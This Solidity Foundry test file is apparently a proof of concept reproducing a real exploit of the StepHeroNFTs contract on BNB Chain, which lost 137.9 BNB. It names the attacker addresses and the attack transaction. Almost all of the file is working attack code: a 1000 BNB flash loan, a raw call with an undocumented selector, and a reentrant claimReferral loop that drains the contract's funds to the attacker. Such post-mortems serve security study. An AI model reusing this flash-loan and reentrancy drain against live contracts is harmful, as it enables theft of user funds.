// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 137.9 BNB
// Original Attacker : https://bscscan.com/address/0xFb1cc1548D039f14b02cfF9aE86757Edd2CDB8A5
// Attack Contract(Init) : https://bscscan.com/address/0xd4c80700ca911d5d3026a595e12aa4174f4cacb3
// Attack Contract(Main) : https://bscscan.com/address/0xb4c32404de3367ca94385ac5b952a7a84b5bdf76
// Attack Contract(Buyer) : https://bscscan.com/address/0x8f327e60fb2a7928c879c135453bd2b4ed6b0fe9
// Vulnerable Contract : https://bscscan.com/address/0x9823E10A0bF6F64F59964bE1A7f83090bf5728aB
// Attack Tx : https://bscscan.com/tx/0xef386a69ca6a147c374258a1bf40221b0b6bd9bc449a7016dbe5240644581877
// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant pancakeV3Pool = 0x172fcD41E0913e95784454622d1c3724f546f849;
address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

address constant stepHeroNFTs = 0x9823E10A0bF6F64F59964bE1A7f83090bf5728aB;

contract StepHeroNFTs_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("bsc", 46843424 - 1);
    }

    function testPoC() public {
        vm.startPrank(attacker);

        new AttackerC(attacker);

        emit log_named_decimal_uint("Profit in BNB", attacker.balance, 18);
    }
}

contract AttackerC {
    constructor (address to) {
        AttackerC1 attC1 = new AttackerC1();
        
        attC1.attack(to);
    }
}

contract AttackerC1 {
    function attack(address to) external {
        Uni_Pair_V3(pancakeV3Pool).flash(
            address(this),
            0,
            1000 ether,
            abi.encode(to)
        );
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        uint256 loanAmount = IERC20(wbnb).balanceOf(address(this));
        WETH(wbnb).withdraw(loanAmount);

        stepHeroNFTs.call(abi.encodeWithSelector(
            bytes4(0xded4de3a), // ???
            address(this),
            2008, // id
            6, // amount
            6, // amount
            loanAmount,
            bytes32(0), // ???
            block.timestamp, // expiry???
            18766392275824 // ???
        ));
        
        AttackerC2 attC2 = new AttackerC2();

        attC2.attack{value: loanAmount}();

        StepHeroNFTs(stepHeroNFTs).claimReferral(address(0));     

        IWETH(payable(wbnb)).deposit{value: loanAmount + fee1}();

        IERC20(wbnb).transfer(pancakeV3Pool, loanAmount + fee1);

        (address to) = abi.decode(data, (address));
        payable(to).transfer(address(this).balance);
    }

    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes memory data) external {}

    receive() external payable {
        if (msg.sender == stepHeroNFTs && msg.value == 3 ether) {
            try StepHeroNFTs(stepHeroNFTs).claimReferral(address(0)) {
            } catch {
                return;
            }
        }
    }
}

contract AttackerC2 {
    function attack() external payable {
        StepHeroNFTs(stepHeroNFTs).buyAsset{value: 1000 ether}(81122, 1, msg.sender);
    }
}

interface StepHeroNFTs {
    function buyAsset(uint256 _id, uint256 amount, address tokenBuyer) external payable;
    function claimReferral(address) external;
}